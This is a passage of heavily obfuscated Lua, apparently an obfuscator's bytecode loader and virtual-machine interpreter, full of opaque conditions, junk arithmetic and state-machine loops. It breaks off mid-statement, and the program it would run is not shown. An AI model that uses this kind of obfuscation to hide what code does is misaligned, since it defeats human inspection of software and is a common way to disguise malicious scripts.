do
    local v0 = tonumber
    local v1 = string.byte
    local v2 = string.char
    local v3 = string.sub
    local v4 = string.gsub
    local v5 = string.rep
    local v6 = table.concat
    local v7 = table.insert
    local v8 = getfenv or function()
            return _ENV
        end
    local v9 = setmetatable
    local v10 = pcall
    local v11 = select
    local v12 = unpack or table.unpack
    local v13 = tonumber
    local function v14(v15, v16)
        local v17 = 1
        local v18
        v15 =
            v4(
            v3(v15, 5),
            "..",
            function(v29)
                if (v1(v29, 2) == 79) then
                    v18 = v0(v3(v29, 1, 1))
                    return ""
                else
                    local v61 = 0
                    local v62
                    while true do
                        if (v61 == 0) then
                            v62 = v2(v0(v29, 16))
                            if v18 then
                                local v92 = v5(v62, v18)
                                v18 = nil
                                return v92
                            else
                                return v62
                            end
                            break
                        end
                    end
                end
            end
        )
        local function v19(v30, v31, v32)
            if v32 then
                local v63 = 0 - 0
                local v64
                while true do
                    if ((909 - (153 + 756)) == v63) then
                        v64 =
                            (v30 / ((7 - 5) ^ (v31 - (4 - 3)))) %
                            ((597 - (575 + 20)) ^ (((v32 - (1 + 0 + 0)) - (v31 - (915 - (896 + 18)))) + (3 - 2)))
                        return v64 - (v64 % (1084 - (278 + 805)))
                    end
                end
            else
                local v65 = 0 + 0
                local v66
                while true do
                    if (v65 == (0 - 0)) then
                        v66 = (2 + 0) ^ (v31 - (1 + 0 + 0))
                        return (((v30 % (v66 + v66)) >= v66) and 1) or (410 - (73 + 337))
                    end
                end
            end
        end
        local function v20()
            local v37 = v1(v15, v17, v17)
            v17 = v17 + 1
            return v37
        end
        local function v21()
            local v38, v39 = v1(v15, v17, v17 + (470 - (351 + 117)))
            v17 = v17 + (672 - (422 + 248))
            return (v39 * (229 + 27)) + v38
        end
        local function v22()
            local v40, v41, v42, v43 = v1(v15, v17, v17 + (570 - (295 + 272)))
            v17 = v17 + 4
            return (v43 * (34526813 - 17749597)) + (v42 * (42149 + 23387)) + (v41 * 256) + v40
        end
        local function v23()
            local v44 = v22()
            local v45 = v22()
            return ((-(1 + 1) * v19(v45, 3 + 29)) + (1017 - (488 + 528))) *
                ((405 - (255 + 148)) ^ (v19(v45, 3 + 18, 566 - (348 + 187)) - (1751 - (137 + (2838 - 2247))))) *
                ((((v19(v45, 1278 - (844 + 433), 1481 - (13 + 1150 + 298)) * (2 ^ (101 - 69))) + v44) /
                    ((60 - (28 + 30)) ^ (5 + 47))) +
                    1 +
                    (243 - (44 + 199)))
        end
        local function v24(v33)
            local v46
            if not v33 then
                local v67 = 0 - 0
                while true do
                    if (v67 == (0 + 0)) then
                        v33 = v22()
                        if (v33 == 0) then
                            return ""
                        end
                        break
                    end
                end
            end
            v46 = v3(v15, v17, (v17 + v33) - (449 - (187 + 261)))
            v17 = v17 + v33
            local v47 = {}
            for v59 = 1 + 0 + 0, #v46 do
                v47[v59] = v2(v1(v3(v46, v59, v59)))
            end
            return v6(v47)
        end
        local v25 = v22
        local function v26(...)
            return {...}, v11("#", ...)
        end
        local function v27()
            local v48 = 1908 - (63 + 1845)
            local v49
            local v50
            local v51
            local v52
            local v53
            local v54
            local v55
            while true do
                if (v48 == 3) then
                    v55 = nil
                    while true do
                        if (2 == v49) then
                            local v88 = 0 + 0
                            while true do
                                if (v88 == 0) then
                                    for v95 = 1 + 0, v22() do
                                        local v96 = 0 - 0
                                        local v97
                                        local v98
                                        while true do
                                            if (v96 == (0 + 0)) then
                                                v97 = 0
                                                v98 = nil
                                                v96 = 1
                                            end
                                            if ((3 - 2) ~= v96) then
                                            else
                                                while true do
                                                    if ((0 + 0) == v97) then
                                                        v98 = v20()
                                                        if (v19(v98, 1318 - (600 + 717), 1) == (0 + 0)) then
                                                            local v111 = 743 - (299 + 444)
                                                            local v112
                                                            local v113
                                                            local v114
                                                            while true do
                                                                if (v111 ~= 1) then
                                                                else
                                                                    local v115 = 0
                                                                    while true do
                                                                        if (v115 ~= (4 - 3)) then
                                                                        else
                                                                            v111 = 2
                                                                            break
                                                                        end
                                                                        if (v115 ~= (0 - 0)) then
                                                                        else
                                                                            v114 = {v21(), v21(), nil, nil}
                                                                            if (v112 == (0 + 0)) then
                                                                                local v202 = 0
                                                                                local v203
                                                                                while true do
                                                                                    if (v202 == (0 + 0)) then
                                                                                        v203 = 0 - 0
                                                                                        while true do
                                                                                            if (0 == v203) then
                                                                                                v114[7 - 4] = v21()
                                                                                                v114[4] = v21()
                                                                                                break
                                                                                            end
                                                                                        end
                                                                                        break
                                                                                    end
                                                                                end
                                                                            elseif (v112 == (2 - 1)) then
                                                                                v114[874 - (419 + 452)] = v22()
                                                                            elseif (v112 == (2 + 0)) then
                                                                                v114[3] =
                                                                                    v22() -
                                                                                    ((594 - (221 + 371)) ^ (74 - 58))
                                                                            elseif (v112 == 3) then
                                                                                local v237 = 0 - 0
                                                                                while true do
                                                                                    if (v237 ~= (409 - (324 + 85))) then
                                                                                    else
                                                                                        v114[1388 - (204 + 1181)] =
                                                                                            v22() - (2 ^ 16)
                                                                                        v114[4] = v21()
                                                                                        break
                                                                                    end
                                                                                end
                                                                            end
                                                                            v115 = 1
                                                                        end
                                                                    end
                                                                end
                                                                if (v111 == 0) then
                                                                    local v116 = 0 - 0
                                                                    while true do
                                                                        if (v116 == (1 + 0)) then
                                                                            v111 = 1554 - (1541 + 12)
                                                                            break
                                                                        end
                                                                        if (v116 == (0 - 0)) then
                                                                            v112 = v19(v98, 1 + 1, 3)
                                                                            v113 = v19(v98, 1 + 3, 6)
                                                                            v116 = 1
                                                                        end
                                                                    end
                                                                end
                                                                if (2 ~= v111) then
                                                                else
                                                                    local v117 = 1422 - (271 + 1151)
                                                                    while true do
                                                                        if (v117 == (0 - 0)) then
                                                                            if
                                                                                (v19(v113, 1, 395 - (349 + 45)) ==
                                                                                    (1 + 0))
                                                                             then
                                                                                v114[1157 - (778 + 377)] =
                                                                                    v55[v114[4 - 2]]
                                                                            end
                                                                            if
                                                                                (v19(
                                                                                    v113,
                                                                                    1764 - (569 + 1193),
                                                                                    1102 - (63 + 1037)
                                                                                ) ==
                                                                                    (1 + 0))
                                                                             then
                                                                                v114[452 - (33 + 416)] =
                                                                                    v55[v114[1817 - (896 + 918)]]
                                                                            end
                                                                            v117 = 1
                                                                        end
                                                                        if ((2 - 1) == v117) then
                                                                            v111 = 2 + 1
                                                                            break
                                                                        end
                                                                    end
                                                                end
                                                                if (v111 == (1 + 2)) then
                                                                    if (v19(v113, 3, 3) == (1 + 0)) then
                                                                        v114[4 + 0] = v55[v114[4]]
                                                                    end
                                                                    v50[v95] = v114
                                                                    break
                                                                end
                                                            end
                                                        end
                                                        break
                                                    end
                                                end
                                                break
                                            end
                                        end
                                    end
                                    for v99 = 1 + 0, v22() do
                                        v51[v99 - 1] = v27()
                                    end
                                    v88 = 1
                                end
                                if (v88 ~= 1) then
                                else
                                    for v101 = 1 + 0, v22() do
                                        v52[v101] = v22()
                                    end
                                    return v53
                                end
                            end
                        end
                        if (v49 == (1013 - (241 + 772))) then
                            local v89 = 0 - 0
                            while true do
                                if (v89 ~= (1292 - (340 + 950))) then
                                else
                                    v49 = 1
                                    break
                                end
                                if (v89 ~= 0) then
                                else
                                    v50 = {}
                                    v51 = {}
                                    v89 = 1
                                end
                                if (v89 ~= 1) then
                                else
                                    v52 = {}
                                    v53 = {v50, v51, nil, v52}
                                    v89 = 1 + 1
                                end
                            end
                        end
                        if (v49 == (1 + 0)) then
                            local v90 = 0
                            local v91
                            while true do
                                if (v90 ~= (0 - 0)) then
                                else
                                    v91 = 0 + 0
                                    while true do
                                        if (v91 == (1637 - (381 + 1255))) then
                                            for v105 = 1 + 0, v54 do
                                                local v106 = 79 - (52 + 27)
                                                local v107
                                                local v108
                                                while true do
                                                    if (v106 ~= (746 - (63 + 683))) then
                                                    else
                                                        local v109 = 0 - 0
                                                        while true do
                                                            if (v109 == (0 + 0)) then
                                                                v107 = v20()
                                                                v108 = nil
                                                                v109 = 1
                                                            end
                                                            if (v109 ~= (1 + 0)) then
                                                            else
                                                                v106 = 1
                                                                break
                                                            end
                                                        end
                                                    end
                                                    if (v106 ~= 1) then
                                                    else
                                                        if (v107 == 1) then
                                                            v108 = v20() ~= (0 + 0)
                                                        elseif (v107 == (4 - 2)) then
                                                            v108 = v23()
                                                        elseif (v107 == 3) then
                                                            v108 = v24()
                                                        end
                                                        v55[v105] = v108
                                                        break
                                                    end
                                                end
                                            end
                                            v53[3] = v20()
                                            v91 = 2 + 0
                                        end
                                        if (v91 == 2) then
                                            v49 = 1449 - (1025 + 422)
                                            break
                                        end
                                        if (v91 == (0 + 0)) then
                                            v54 = v22()
                                            v55 = {}
                                            v91 = 1 + 0
                                        end
                                    end
                                    break
                                end
                            end
                        end
                    end
                    break
                end
                if (0 ~= v48) then
                else
                    v49 = 0 + 0
                    v50 = nil
                    v48 = 943 - (188 + 754)
                end
                if (v48 ~= (1608 - (647 + 960))) then
                else
                    v51 = nil
                    v52 = nil
                    v48 = 1 + 1
                end
                if (v48 ~= 2) then
                else
                    v53 = nil
                    v54 = nil
                    v48 = 3
                end
            end
        end
        local function v28(v34, v35, v36)
            local v56 = v34[1]
            local v57 = v34[2]
            local v58 = v34[3]
            return function(...)
                local v68 = 1
                local v69 = -1
                local v70 = {...}
                local v71 = v11("#", ...) - 1
                local function v72()
                    local v73 = v56
                    local v74 = Const
                    local v75 = v57
                    local v76 = v58
                    local v77 = v26
                    local v78 = {}
                    local v79 = {}
                    local v80 = {}
                    for v85 = 1130 - (221 + 909), v71 do
                        if ((9 < (3334 - (100 + 200))) and (v85 >= v76)) then
                            v78[v85 - v76] = v70[v85 + (4 - 3)]
                        else
                            v80[v85] = v70[v85 + (2 - 1)]
                        end
                    end
                    local v81 = (v71 - v76) + 1 + 0
                    local v82
                    local v83
                    while true do
                        local v86 = 0 + 0
                        local v87
                        while true do
                            if ((v86 == 0) or ((818 + 454) < (669 + 402))) then
                                v87 = 0 - 0
                                while true do
                                    if ((v87 == (0 - 0)) or ((5407 - (576 + 939)) <= (1608 + 968))) then
                                        local v103 = 0
                                        while true do
                                            if
                                                (((2155 - (74 + 856)) <= (9763 - 5440)) and
                                                    (v103 == (1731 - (217 + 814 + 700))))
                                             then
                                                v82 = v73[v68]
                                                v83 = v82[1 + 0]
                                                v103 = 2 - 1
                                            end
                                            if ((v103 == ((2 + 2) - 3)) or ((18893 - 14468) < (230 + 2196))) then
                                                v87 = 1 + 0
                                                break
                                            end
                                        end
                                    end
                                    if (((177 + 176) <= (4503 - 2107)) and (v87 == (531 - (98 + 432)))) then
                                        if (((5394 - (756 + 205)) == (6233 - 1800)) and (v83 <= (8 + 8))) then
                                            if (((13830 - 8987) >= (6667 - 4277)) and (v83 <= (1173 - (282 + 884)))) then
                                                if
                                                    (((11175 - 6783) >= (1405 - 487)) and
                                                        (v83 <= ((1473 - (1384 + 88)) + 2)))
                                                 then
                                                    if
                                                        (((1748 - (711 + 886)) <=
                                                            ((2549 - (535 + 246)) + (3499 - (224 + 178)))) and
                                                            (v83 <= (4 - 3)))
                                                     then
                                                        if ((v83 == (0 - 0)) or ((742 + 1735) >= (5238 - (696 + 92)))) then
                                                            v80[v82[3 - 1]] = {}
                                                        else
                                                            v80[v82[3 - 1]] = v80[v82[5 - 2]] + v82[15 - 11]
                                                        end
                                                    elseif ((v83 > (1 + 1)) or ((9727 - 5409) < (375 + 1750))) then
                                                        v80[v82[(1 - 0) + 1]] = v82[7 - 4]
                                                    else
                                                        local v122 = 0 + 0
                                                        local v123
                                                        local v124
                                                        local v125
                                                        local v126
                                                        local v127
                                                        while true do
                                                            if
                                                                ((v122 == (867 - (275 + 591))) or
                                                                    ((4312 - (334 + 1)) <= (4 + 218)))
                                                             then
                                                                v125 = nil
                                                                v126 = nil
                                                                v122 = 1 + 1 + 0
                                                            end
                                                            if
                                                                ((v122 == (2 + 0)) or
                                                                    ((2944 + 180) == (4428 - (933 + 867))))
                                                             then
                                                                v127 = nil
                                                                while true do
                                                                    if
                                                                        (((3225 + 1286) >= (4067 - 1939)) and
                                                                            (v123 == (1 + 1)))
                                                                     then
                                                                        for v217 = v124, v69 do
                                                                            local v218 = 0 - 0
                                                                            while true do
                                                                                if
                                                                                    (((316 + 1048) >= (1036 - 769)) and
                                                                                        (v218 == (0 - 0)))
                                                                                 then
                                                                                    v127 = v127 + (2 - 1)
                                                                                    v80[v217] = v125[v127]
                                                                                    break
                                                                                end
                                                                            end
                                                                        end
                                                                        break
                                                                    end
                                                                    if (((15792 - 11766) <= 4377) and ((1 + 0) == v123)) then
                                                                        v69 = (v126 + v124) - (3 - 2)
                                                                        v127 = 590 - (482 + (262 - 154))
                                                                        v123 = 1 + 1
                                                                    end
                                                                    if
                                                                        (((3034 - (97 + 1828)) <= (20130 - 15695)) and
                                                                            ((1453 - (868 + 585)) == v123))
                                                                     then
                                                                        local v207 = 0
                                                                        while true do
                                                                            if
                                                                                (((0 + 0 + 0) == v207) or
                                                                                    ((93 + 32) >= ((992 + 47) - 770)))
                                                                             then
                                                                                v124 = v82[1182 - (1160 + 20)]
                                                                                v125, v126 =
                                                                                    v77(
                                                                                    v80[v124](
                                                                                        v12(
                                                                                            v80,
                                                                                            v124 +
                                                                                                ((488 - (182 + 302)) - 3),
                                                                                            v82[10 - 7]
                                                                                        )
                                                                                    )
                                                                                )
                                                                                v207 = 126 - ((649 - (70 + 547)) + 93)
                                                                            end
                                                                            if
                                                                                (((4008 - (8 + 936)) >=
                                                                                    (3771 - (14 + 1932))) and
                                                                                    (v207 == (1411 - (866 + 544))))
                                                                             then
                                                                                v123 = 1634 - (1177 + 456)
                                                                                break
                                                                            end
                                                                        end
                                                                    end
                                                                end
                                                                break
                                                            end
                                                            if
                                                                (((3899 - (1030 + 306 + 140)) < (8134 - 5373)) and
                                                                    ((1148 - (760 + 388)) == v122))
                                                             then
                                                                v123 = 0 + 0
                                                                v124 = nil
                                                                v122 = (2724 - (216 + 1717)) - (76 + 714)
                                                            end
                                                        end
                                                    end
                                                elseif ((v83 <= (446 - (276 + 165))) or ((5117 - 3401) >= 2885)) then
                                                    if
                                                        ((v83 == (1 + 3)) or
                                                            ((3619 - (148 + (2039 - 1250))) <= (1624 + 83)))
                                                     then
                                                        local v128 = 258 - (51 + 207)
                                                        local v129
                                                        local v130
                                                        while true do
                                                            if
                                                                ((0 == v128) or
                                                                    ((5674 - (1440 + 158)) < (1922 - (343 + 337))))
                                                             then
                                                                local v194 = 0 + 0
                                                                while true do
                                                                    if
                                                                        (((15024 - 11347) >
                                                                            (5000 - (116 + (3934 - 2218)))) and
                                                                            (v194 == ((2 + 0) - 1)))
                                                                     then
                                                                        v128 = 1 + 0
                                                                        break
                                                                    end
                                                                    if
                                                                        (((10397 - 7376) < (4940 - (605 + 512))) and
                                                                            (v194 == (296 - (291 + 5))))
                                                                     then
                                                                        v129 = v82[8 - 5]
                                                                        v130 = v80[v129]
                                                                        v194 = 1 + 0
                                                                    end
                                                                end
                                                            end
                                                            if
                                                                ((v128 == (228 - (178 + 49))) or
                                                                    ((9589 - 5638) <= (7702 - 4589)))
                                                             then
                                                                for v198 = v129 + (628 - (570 + 57)), v82[2 + (6 - 4)] do
                                                                    v130 = v130 .. v80[v198]
                                                                end
                                                                v80[v82[(2424 - (816 + 1171)) - (122 + 210 + 103)]] =
                                                                    v130
                                                                break
                                                            end
                                                        end
                                                    else
                                                        v80[v82[1545 - (1255 + (1162 - (363 + 511)))]] =
                                                            v36[v82[6 - (2 + 1)]]
                                                    end
                                                elseif (((2411 + 1278) >= (281 + 559)) and (v83 > ((6 - 3) + 3))) then
                                                    local v132 = (0 + 0) - 0
                                                    local v133
                                                    local v134
                                                    local v135
                                                    local v136
                                                    local v137
                                                    while true do
                                                        if ((v132 == (4 - 1)) or ((1529 - 748) >= (3433 + 460))) then
                                                            if (v137 or ((719 + 97 + 93) == (348 + 62))) then
                                                                local v206 = 0 + 0
                                                                while true do
                                                                    if
                                                                        ((v206 == (0 - 0)) or
                                                                            ((3127 - (639 + 142)) > (8805 - 6384)))
                                                                     then
                                                                        v80[v135] = v137
                                                                        v68 = v82[931 - (852 + 76)]
                                                                        break
                                                                    end
                                                                end
                                                            else
                                                                v68 = v68 + (810 - (567 + 242))
                                                            end
                                                            break
                                                        end
                                                        if
                                                            (((6600 - 3752) < (3740 - (106 + 23))) and
                                                                (v132 == (1045 - (36 + 1009))))
                                                         then
                                                            v133 = v82[(1329 - (84 + 1244)) + 1]
                                                            v134 = v82[(1091 - (548 + 531)) - 8]
                                                            v132 = 1789 - (480 + (4311 - 3003))
                                                        end
                                                        if
                                                            ((v132 == (706 - (142 + 562))) or
                                                                ((3532 - (549 + 840)) > ((3567 - (354 + 319)) + 682)))
                                                         then
                                                            local v196 = 0 + 0
                                                            while true do
                                                                if
                                                                    (((461 + 233) > (2077 - ((664 - 376) + 1439))) and
                                                                        ((810 - (573 + 237)) == v196))
                                                                 then
                                                                    for v219 = 4 - 3, v134 do
                                                                        v80[v135 + v219] = v136[v219]
                                                                    end
                                                                    v137 = v136[1]
                                                                    v196 = 1 + 0
                                                                end
                                                                if
                                                                    (((1127 - (72 + 14)) > (1757 - (529 + 415))) and
                                                                        (v196 == (1261 - (235 + 1025))))
                                                                 then
                                                                    v132 = 3
                                                                    break
                                                                end
                                                            end
                                                        end
                                                        if
                                                            ((v132 == (1 + 0 + (0 - 0))) or
                                                                ((4384 - (77 + 673)) < (741 + 707)))
                                                         then
                                                            local v197 = (0 - 0) + 0
                                                            while true do
                                                                if
                                                                    ((v197 == (1 + 0)) or
                                                                        ((814 + 2536) <= ((11233 - 6102) - 3234)))
                                                                 then
                                                                    v132 = 4 - (1963 - (585 + 1376))
                                                                    break
                                                                end
                                                                if
                                                                    (((2289 + 1 + 84) < (5167 - (463 + 429))) and
                                                                        (v197 == (0 - 0)))
                                                                 then
                                                                    v135 = v133 + (6 - 4)
                                                                    v136 = {v80[v133](v80[v133 + (3 - 2)], v80[v135])}
                                                                    v197 = 3 - 2
                                                                end
                                                            end
                                                        end
                                                    end
                                                else
                                                    local v138 = 0 + 0
                                                    local v139
                                                    local v140
                                                    while true do
                                                        if
                                                            (((2226 - (171 + 1437)) < (1698 + 1697)) and
                                                                (v138 == (4 - 3)))
                                                         then
                                                            while true do
                                                                if
                                                                    ((v139 == (1863 - (1307 + 556))) or
                                                                        (295 >= ((38530 - 26363) - 9096)))
                                                                 then
                                                                    v140 = v82[2 + 0]
                                                                    do
                                                                        return v80[v140](
                                                                            v12(
                                                                                v80,
                                                                                v140 + (1429 - (439 + 989)),
                                                                                v82[1426 - (339 + 1084)]
                                                                            )
                                                                        )
                                                                    end
                                                                    break
                                                                end
                                                            end
                                                            break
                                                        end
                                                        if
                                                            ((((10404 - 5614) - (298 + 88)) >= ((12984 - 9753) - 1894)) and
                                                                (v138 == (0 + (447 - (49 + 398)))))
                                                         then
                                                            v139 = 0 - 0
                                                            v140 = nil
                                                            v138 = (276 + 909) - (933 + 251)
                                                        end
                                                    end
                                                end
                                            elseif (((2901 - 536) <= (23211 - 18342)) and (v83 <= (14 - 3))) then
                                                if (((20259 - 15596) >= (864 + 2851)) and (v83 <= (26 - 17))) then
                                                    if
                                                        ((v83 > (1 + 7)) or
                                                            ((4967 - (570 + 1193)) < (3782 - (476 + 528))))
                                                     then
                                                        v80[v82[1456 - (408 + 1046)]] =
                                                            v80[v82[1457 - ((195 - 134) + 1393)]] - v82[3 + 1]
                                                    elseif
                                                        ((v82[1 + 1] == v80[v82[6 - (2 + 0)]]) or
                                                            (((730 - 546) + (12802 - 8218)) < (1084 - (13 + 751))))
                                                     then
                                                        v68 = v68 + (1802 - (121 + 1680)) + 0
                                                    else
                                                        v68 = v82[3 + 0]
                                                    end
                                                elseif
                                                    (((2819 - 1484) <= (135 + 4663)) and
                                                        (v83 == ((1230 - 815) - (93 + 241 + 71))))
                                                 then
                                                    if
                                                        (((6758 - 4654) <= (4 + 1388 + 2851)) and
                                                            (v80[v82[2 - 0]] ~= v80[v82[8 - 4]]))
                                                     then
                                                        v68 = v68 + (1230 - (1023 + 206))
                                                    else
                                                        v68 = v82[(582 - (257 + 323)) + 1]
                                                    end
                                                elseif
                                                    ((v80[v82[654 - (247 + 405)]] == v82[17 - 13]) or
                                                        ((2303 + 882) <= (3142 - (989 + 967))))
                                                 then
                                                    v68 = v68 + 1 + 0
                                                else
                                                    v68 = v82[1 + 2]
                                                end
                                            elseif
                                                ((v83 <= (55 - 42)) or ((2002 + 1268) <= ((1407 - 641) - (145 + 76))))
                                             then
                                                if (((9525 - 5924) >= (424 + 149)) and (v83 > (19 - 7))) then
                                                    local v142 = 0 + 0
                                                    local v143
                                                    local v144
                                                    local v145
                                                    local v146
                                                    local v147
                                                    while true do
                                                        if (((299 + 1386) >= (656 - 454)) and (v142 == (1 + 1))) then
                                                            v147 = nil
                                                            while true do
                                                                if ((v143 == (0 + 0)) or ((2511 - 833) == (741 + 507))) then
                                                                    v144 = 0 - (0 + 0)
                                                                    v145 = nil
                                                                    v143 = 194 - (59 + (1535 - (1307 + 94)))
                                                                end
                                                                if
                                                                    (((1862 + (3118 - (1442 + 4))) ==
                                                                        (1080 + (6393 - 3939))) and (v143 == (5 - 3)))
                                                                 then
                                                                    while true do
                                                                        if
                                                                            (((343 + 383) <=
                                                                                ((11600 - (243 + 698)) - 6936)) and
                                                                                (v144 == (2 + 0)))
                                                                         then
                                                                            if
                                                                                ((v146 > (0 - 0)) or
                                                                                    ((1724 - 790) ==
                                                                                        ((1194 + 945) -
                                                                                            ((2463 - (755 + 604)) + 772))))
                                                                             then
                                                                                if
                                                                                    ((v147 <= v80[v145 + 1 + 0]) or
                                                                                        ((2656 - (794 + 73)) >
                                                                                            (4322 -
                                                                                                (143 +
                                                                                                    (906 - (81 + 417))))))
                                                                                 then
                                                                                    local v238 = 1159 - (463 + 643 + 53)
                                                                                    local v239
                                                                                    local v240
                                                                                    while true do
                                                                                        if
                                                                                            ((v238 ==
                                                                                                (1121 - (1120 + 1))) or
                                                                                                ((1924 + 940) <=
                                                                                                    ((2837 - 1266) -
                                                                                                        (55 + 519))))
                                                                                         then
                                                                                            v239 = 0 - (0 + 0)
                                                                                            v240 = nil
                                                                                            v238 = 1 + 0
                                                                                        end
                                                                                        if
                                                                                            ((v238 == (1 + 0)) or
                                                                                                ((3085 -
                                                                                                    (241 +
                                                                                                        (1322 -
                                                                                                            (642 + 641)))) <
                                                                                                    (1928 - (516 + 997))))
                                                                                         then
                                                                                            while true do
                                                                                                if
                                                                                                    ((v239 ==
                                                                                                        (1413 -
                                                                                                            (8 + 1210 +
                                                                                                                195))) or
                                                                                                        ((6657 - 3460) <
                                                                                                            (3753 -
                                                                                                                (300 +
                                                                                                                    1251))))
                                                                                                 then
                                                                                                    v240 =
                                                                                                        1215 -
                                                                                                        (294 + 921)
                                                                                                    while true do
                                                                                                        if
                                                                                                            (((5299 -
                                                                                                                1351) <=
                                                                                                                (1716 +
                                                                                                                    3019)) and
                                                                                                                ((0 - 0) ==
                                                                                                                    v240))
                                                                                                         then
                                                                                                            v68 =
                                                                                                                v82[
                                                                                                                842 -
                                                                                                                    (36 +
                                                                                                                        803)
                                                                                                            ]
                                                                                                            v80[
                                                                                                                    v145 +
                                                                                                                        (1675 -
                                                                                                                            (735 +
                                                                                                                                937))
                                                                                                                ] = v147
                                                                                                            break
                                                                                                        end
                                                                                                    end
                                                                                                    break
                                                                                                end
                                                                                            end
                                                                                            break
                                                                                        end
                                                                                    end
                                                                                end
                                                                            elseif
                                                                                (((2402 + 923) <= 3509) and
                                                                                    (v147 >= v80[v145 + 1 + 0]))
                                                                             then
                                                                                local v241 = 1907 - (983 + 691 + 233)
                                                                                while true do
                                                                                    if
                                                                                        ((v241 == (0 - 0)) or
                                                                                            ((656 + 388) > 2902))
                                                                                     then
                                                                                        v68 = v82[3 + 0]
                                                                                        v80[
                                                                                                v145 + 3 +
                                                                                                    (1588 - (431 + 1157))
                                                                                            ] = v147
                                                                                        break
                                                                                    end
                                                                                end
                                                                            end
                                                                            break
                                                                        end
                                                                        if
                                                                            (((14229 - 9601) >= (9309 - 5413)) and
                                                                                (v144 ==
                                                                                    ((1773 - 1254) -
                                                                                        ((2250 - (842 + 937)) + 48))))
                                                                         then
                                                                            local v226 = 0 + 0 + 0
                                                                            local v227
                                                                            while true do
                                                                                if
                                                                                    (((1448 - 835) < (457 + 4157)) and
                                                                                        (v226 == (0 - 0)))
                                                                                 then
                                                                                    v227 = 1367 - (1018 + 349)
                                                                                    while true do
                                                                                        if
                                                                                            ((v227 == (1 + 0)) or
                                                                                                ((18112 - 13557) <= 3265))
                                                                                         then
                                                                                            v144 = 1 - 0
                                                                                            break
                                                                                        end
                                                                                        if
                                                                                            (((4632 - (853 + 521)) ==
                                                                                                (8685 - 5427)) and
                                                                                                (v227 ==
                                                                                                    (521 - (269 + 252))))
                                                                                         then
                                                                                            v145 = v82[2 + 0 + 0]
                                                                                            v146 =
                                                                                                v80[
                                                                                                v145 +
                                                                                                    ((1691 -
                                                                                                        (1317 + 370)) -
                                                                                                        2)
                                                                                            ]
                                                                                            v227 = 1 + 0
                                                                                        end
                                                                                    end
                                                                                    break
                                                                                end
                                                                            end
                                                                        end
                                                                        if
                                                                            ((v144 == (1937 - (1195 + 741))) or
                                                                                ((4177 - (613 + 894)) >= 4914))
                                                                         then
                                                                            local v228 = 0 + 0
                                                                            local v229
                                                                            while true do
                                                                                if
                                                                                    ((v228 == (0 + 0)) or
                                                                                        ((5831 - (895 + 117)) <=
                                                                                            (4510 + 217)))
                                                                                 then
                                                                                    v229 = 0 + 0
                                                                                    while true do
                                                                                        if
                                                                                            (((4214 - (150 + 1384)) >
                                                                                                (1352 - (460 + 390))) and
                                                                                                (v229 == (0 - 0)))
                                                                                         then
                                                                                            local v245 = 0 + 0 + 0
                                                                                            while true do
                                                                                                if
                                                                                                    (((1 + 0) == v245) or
                                                                                                        ((5648 - 3043) >=
                                                                                                            (8598 - 3711)))
                                                                                                 then
                                                                                                    v229 = 3 - 2
                                                                                                    break
                                                                                                end
                                                                                                if
                                                                                                    (((39 + 236) <=
                                                                                                        (2076 +
                                                                                                            (1476 -
                                                                                                                (819 +
                                                                                                                    262)))) and
                                                                                                        (v245 == (0 + 0)))
                                                                                                 then
                                                                                                    v147 =
                                                                                                        v80[v145] + v146
                                                                                                    v80[v145] = v147
                                                                                                    v245 = 1 + (0 - 0)
                                                                                                end
                                                                                            end
                                                                                        end
                                                                                        if
                                                                                            (((1267 - 645) == 622) and
                                                                                                (v229 ==
                                                                                                    ((1261 - (182 + 509)) -
                                                                                                        (89 + 480))))
                                                                                         then
                                                                                            v144 = 2 + 0
                                                                                            break
                                                                                        end
                                                                                    end
                                                                                    break
                                                                                end
                                                                            end
                                                                        end
                                                                    end
                                                                    break
                                                                end
                                                                if
                                                                    (((813 + 939) <= (5624 - (1139 + 743))) and
                                                                        (v143 == (1172 - (1145 + 26))))
                                                                 then
                                                                    local v208 = 0 + 0
                                                                    while true do
                                                                        if
                                                                            ((v208 == (256 - (212 + 44))) or
                                                                                ((7650 - 4719) <
                                                                                    ((115 + 2515) - (634 + 1178))))
                                                                         then
                                                                            v146 = nil
                                                                            v147 = nil
                                                                            v208 = 1838 - (1654 + 183)
                                                                        end
                                                                        if
                                                                            ((v208 == (642 - (273 + 368))) or
                                                                                ((206 + 40) >=
                                                                                    ((14207 - 8410) - (3545 - 2562))))
                                                                         then
                                                                            v143 = 699 - (352 + 345)
                                                                            break
                                                                        end
                                                                    end
                                                                end
                                                            end
                                                            break
                                                        end
                                                        if
                                                            ((v142 == (2 - 1)) or
                                                                ((3133 - ((2455 - (857 + 948)) + 328)) >=
                                                                    (3822 - (555 + 616))))
                                                         then
                                                            v145 = nil
                                                            v146 = nil
                                                            v142 = 5 - (6 - 3)
                                                        end
                                                        if
                                                            (((5654 - (20 + 1164)) >= 4263) and
                                                                (v142 == ((1248 - 478) - (486 + 284))))
                                                         then
                                                            v143 = 0 + 0
                                                            v144 = nil
                                                            v142 = 2 - 1
                                                        end
                                                    end
                                                else
                                                    local v148 = 0 + 0
                                                    local v149
                                                    while true do
                                                        if
                                                            (((1380 - (610 + 715)) <= (3770 - (539 + 576))) and
                                                                (v148 == ((1845 - (443 + 1402)) - (0 + 0))))
                                                         then
                                                            v149 = v82[344 - (338 + 4)]
                                                            v80[v149](v12(v80, v149 + (1622 - (1458 + 163)), v69))
                                                            break
                                                        end
                                                    end
                                                end
                                            elseif ((v83 <= 14) or ((10267 - 5980) < 2488)) then
                                                v80[v82[2 + 0]] = v28(v75[v82[13 - 10]], nil, v36)
                                            elseif
                                                ((((4357 - (219 + 144)) - (102 + 341)) >= (593 + 1055)) and
                                                    (v83 > (571 - (405 + 33 + 118))))
                                             then
                                                v80[v82[62 - ((75 - 56) + 41)]] =
                                                    v80[v82[7 - 4]] / v82[(2107 - (102 + 124)) - (260 + 1617)]
                                            elseif
                                                ((v80[v82[2 + 0]] ~= v82[4 + 0]) or
                                                    ((2087 - ((940 - (220 + 404)) + 190)) < ((842 - (93 + 739)) + 16)))
                                             then
                                                v68 = v68 + 1 + 0
                                            else
                                                v68 = v82[913 - (591 + 319)]
                                            end
                                        elseif (((181 + 66) == ((885 - (520 + 184)) + 66)) and (v83 <= 25)) then
                                            if ((v83 <= (78 - 58)) or ((381 + 1507) == (6054 - 1259))) then
                                                if ((v83 <= (6 + 12)) or ((30 + 4735) <= (2280 - 1436))) then
                                                    if
                                                        ((v83 == (1136 - (1074 + 45))) or
                                                            (((2956 - (69 + 1293)) + 1158) <= (3007 - (301 + 1376))))
                                                     then
                                                        local v151 = 0 + 0
                                                        local v152
                                                        local v153
                                                        while true do
                                                            if
